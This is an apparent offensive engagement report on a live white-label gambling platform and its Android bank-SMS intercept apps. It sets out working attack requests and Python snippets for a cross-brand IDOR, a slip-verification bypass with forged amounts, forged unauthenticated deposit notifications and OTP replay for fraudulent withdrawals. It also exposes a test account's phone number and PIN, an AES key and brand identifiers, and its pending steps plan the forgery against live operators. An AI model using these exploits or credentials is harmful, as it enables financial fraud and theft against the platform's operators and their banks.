# CTMX Platform — SMS Intercept & Deposit Flow Analysis
**Engagement:** WE88Z-VAK88-2026-09  
**Date:** 2026-09-19  
**Status:** Recon complete, exploit scripts ready

---

## Platform Overview

CTMX (`ctmx.cc`) is a white-label SaaS gambling platform serving hundreds of operator brands. Each brand gets a subdomain (`{brand}.ctmx.cc`) backed by a shared API cluster behind CloudFront CDN. The platform implements automated deposit crediting via bank SMS/notification interception.

- **API base:** `https://d1cko8y2v39is.cloudfront.net`
- **Operator portals:** `https://{brand}.ctmx.cc`
- **Known operator:** wink999plus (`64edb564cfd6a80012088d91`) → `wink999plus.ctmx.cc`

---

## SMS Bank Intercepter Architecture

CTMX operators run one or more Android devices with intercepter APKs from `ProjectAndroid.zip` (obtained from engagement). The full deposit flow:

```
User → deposit request on casino site
  → casino shows operator bank account to transfer to
User → real bank transfer
  → Bank sends SMS or push notification to operator's Android
Android APK → parses notification → POST to operator's backend
Operator backend → matches amount → POST to CTMX API to credit wallet
  OR
Android APK → posts directly to CTMX if type_bank_id=146 (autopeer)
```

### APK Suite (ProjectAndroid.zip)

All apps use **OkHttp3** with plain form-encoded POST — no encryption, no auth headers.  
Domain and bank account are configured via `SharedPreferences` UI.

| APK | Package | Trigger | Banks | Endpoint |
|-----|---------|---------|-------|----------|
| BankNoticeCapture | `com.example.banknoticecapture` | LINE app notifications (`jp.naver.line.android`) | SCB Connect, GSB NOW | `https://{Domain}/api/CheckNoticeBank?BankType={SCB\|GSB}` |
| BankAppCapture | `com.example.bankappcapture` | Native bank app notifications | KTB (`ktbcs.netbank`), TTB (`com.TMBTOUCH.PRODUCTION`) | `https://{Domain}/api/CheckNoticeBank?BankType={KTB\|TTB}` |
| BankSMS_Intercepter | `com.example.otp` | SMS broadcast | All banks via SMS | `https://{Domain}/api/CheckAmtBankVX` (AES-256-CBC, key `omg357159wtf`) |
| BankWithdrawOTP | `com.example.otp` | SMS broadcast (OTP only) | Krungsri (BAY), GSB | `https://{Domain}/api/WithdrawOTP.php?BankType={BAY\|GSB}` |
| KaichonNoticeCapture | `com.example.kaichonnoticecapture` | LINE app notifications | Any (raw forward) | `https://{Domain}/cmd/Sync` |

### Payload Schema (BankNoticeCapture / BankAppCapture)

```
POST https://{Domain}/api/CheckNoticeBank?BankType=SCB
Content-Type: application/x-www-form-urlencoded

Body=รับโอนเงิน 1000.00 บาท จาก XXX&BankNumber=0123456789
```

No auth. No HMAC. Any IP can POST.

### Payload Schema (BankWithdrawOTP)

```
POST https://{Domain}/api/WithdrawOTP.php?BankType=BAY
Content-Type: application/x-www-form-urlencoded

Body=<OTP full SMS text>&BankNumber=0123456789
```

Used for withdrawal authorization — intercepts OTP for operator bank transfers.

### KaichonNoticeCapture (different server)

Posts raw LINE notification body to `/cmd/Sync` with no BankNumber. Different backend architecture — likely a Kaichon-specific C2 that only needs the LINE body to parse transfer confirmation.

---

## CTMX API Authentication

### Headers

| Header | Value | Purpose |
|--------|-------|---------|
| `x-exp-signature` | `{brand_id}` (MongoDB ObjectId) | Brand isolation |
| `X-White-Lable-Name` | `cm` | Platform identifier |
| `Authorization` | `Bearer {accessToken}` | User JWT (after login) |

### Login Flow

```http
POST https://d1cko8y2v39is.cloudfront.net/players-auth
x-exp-signature: 64edb564cfd6a80012088d91
X-White-Lable-Name: cm
Content-Type: application/json

{"username":"<phone>","password":"<pin>","brands_id":"64edb564cfd6a80012088d91"}

→ 201 {"accessToken":"<jwt>", ...}
```

### Registration (auto-register on any brand)

```http
POST /players
{"username":"<phone>","password":"<pin>","brands_id":"<any_brand_id>","pincode":"<pin>"}
```

Allows creating accounts on any brand using only the brand ObjectId — no invite code.

---

## Deposit Flow (User Perspective)

```
GET  /player-bank-topup        → list of deposit options per brand
POST /payment-deposit          → initiate deposit (body: {type_bank_id, price})
POST /images (multipart)       → upload bank slip image → {link}
POST /slip-verify              → verify slip: {bank_id, money, imageUrl}
```

### type_bank_id Values (Known)

| ID | Method |
|----|--------|
| 3 | KTB QR slip |
| 21 | TrueWallet |
| 146 | Autopeer (automated bank intercept) |
| 147/148 | Autopeer variants |

**Autopeer (146)** = deposit is auto-credited when operator's Android intercept APK posts matching bank notification. No slip upload required.

---

## Exploitation Paths

### Path 1: Cross-Brand IDOR via Bearer Reuse

**Mechanism:** Bearer token from brand A may be accepted by brand B if `x-exp-signature` is swapped.

```python
# Login to wink999plus (brand A)
tok = login("64edb564cfd6a80012088d91")

# POST /payment-deposit with different brand's x-exp-signature
# → may credit wallet on brand B using brand A's token
r = sess.post(CF + "/payment-deposit",
    json={"price": 200, "type_bank_id": 146},
    headers={"Authorization": f"Bearer {tok}",
             "x-exp-signature": OTHER_BRAND_ID,  # ← IDOR pivot
             "X-White-Lable-Name": "cm"})
```

Tested across ~30 brands in `ctmx_autopeer_scan.py` — no confirmed hit yet (rate limit 1 req/30s per player).

### Path 2: Slip Verification Bypass

**Mechanism:** Upload any JPEG to `/images`, use returned URL in `/slip-verify` with arbitrary `money` amount.

```python
# Upload any image (doesn't have to be a real slip)
r = sess.post(CF + "/images", multipart=image_data, headers=H)
image_url = r.json()["link"]

# Submit slip verify with target amount
r2 = sess.post(CF + "/slip-verify",
    json={"bank_id": CASINO_BANK_ID, "money": 50000, "imageUrl": image_url},
    headers=H)
```

The slip verify endpoint performs OCR — forged slips from `slipgen.py` may pass if OCR reads the forged amount.

### Path 3: Forged Bank Notification → CheckNoticeBank

**Mechanism:** `BankNoticeCapture`/`BankAppCapture` endpoints accept unauthenticated POST. If operator domain is known, forge deposit notification directly.

```http
POST https://{operator_domain}/api/CheckNoticeBank?BankType=SCB
Content-Type: application/x-www-form-urlencoded

Body=SCB Connect: รับโอนเงิน 10000.00 บาท จาก นาย TEST 123&BankNumber={operator_bank_acct}
```

**Requires:** knowing operator's server domain (not always ctmx.cc subdomain — operators run their own servers).

### Path 4: OTP Capture via BankWithdrawOTP Endpoint

If operator exposes `/api/WithdrawOTP.php`:
- Listen on operator domain for OTP SMS intercept
- Replay OTP to initiate fraudulent withdrawal from operator's bank account

### Path 5: Brand Enumeration for Reconnaissance

`/brands-setting/{brand_id}` returns deposit config unauthenticated for any brand ObjectId:
```
GET https://d1cko8y2v39is.cloudfront.net/brands-setting/64edb564cfd6a80012088d91
x-exp-signature: 64edb564cfd6a80012088d91
X-White-Lable-Name: cm
```

Exposes: deposit bank accounts, QR code configs, autopeer status, TrueWallet wallet IDs.

### Path 6: Player Registration IDOR + Account Enumeration

Any brand can have accounts registered with the same phone number. Once authenticated:
- GET `/player-bank-topup` exposes all operator bank accounts for that brand
- Combine with cross-brand IDOR to map full bank account surface

---

## Exploit Scripts (nuxt/)

| Script | Purpose |
|--------|---------|
| `ctmx_autopeer_scan.py` | Cross-brand IDOR scan — test autopeer on all brands with wink JWT |
| `ctmx_brands_unauth.py` | Unauthenticated brand-setting enumeration |
| `ctmx_brand_scan.py` | Authenticated scan for autopeer/no-QR/TW across 30 brands |
| `ctmx_slip_deposit.py` | Slip upload + slip-verify flow against wink999plus |
| `ctmx_real_slip.py` | Real slip images from slip_all/ → slip-verify OCR test |
| `ctmx_reg_scan.py` / `ctmx_reg_scan2.py` | Auto-register + probe deposit endpoints across brands |

---

## Key Credentials / Identifiers

| Item | Value |
|------|-------|
| CF API base | `https://d1cko8y2v39is.cloudfront.net` |
| wink999plus brand_id | `64edb564cfd6a80012088d91` |
| wink test account | `0647922048` / `2310` |
| wink KTB casino bank ID | `650e1beebf995a0013ab7678` |
| BankSMS_Intercepter key | `omg357159wtf` (AES-256-CBC) |

---

## Pending / Next Steps

1. **CheckNoticeBank unauthenticated forge** — identify an active operator domain running BankNoticeCapture; send forged deposit notification
2. **Cross-brand IDOR completion** — run `ctmx_autopeer_scan.py` against full brand list (must respect rate limit 1 req/30s)
3. **Slip OCR bypass** — test `slipgen.py`-generated slips with matching bank account → `/slip-verify`
4. **OTP endpoint discovery** — scan `{brand}.ctmx.cc` hostnames for exposed `/api/WithdrawOTP.php`
5. **KaichonNoticeCapture server** — identify what server listens on `/cmd/Sync` — separate platform, not CTMX

---

## Relationship to LUX / UFA

| Aspect | LUX (Luxino/ztechdev) | CTMX (ctmx.cc) | UFA |
|--------|----------------------|----------------|-----|
| APK | LuxSms-v3.apk (Kotlin) | ProjectAndroid suite (Java) | Unknown |
| C2 auth | Static `PAPDIEAW-KEY` / dynamic Bearer | No auth on intercept endpoint | Unknown |
| Encoding | None (JSON) / AES-CBC | None (form-encoded) | Unknown |
| CF protection | CF proxy on C2s | CloudFront for API | Unknown |
| Active C2 | Offline (530/521) | `d1cko8y2v39is.cloudfront.net` LIVE | Unknown |

CTMX is the only platform with a confirmed live API endpoint as of 2026-09-19.
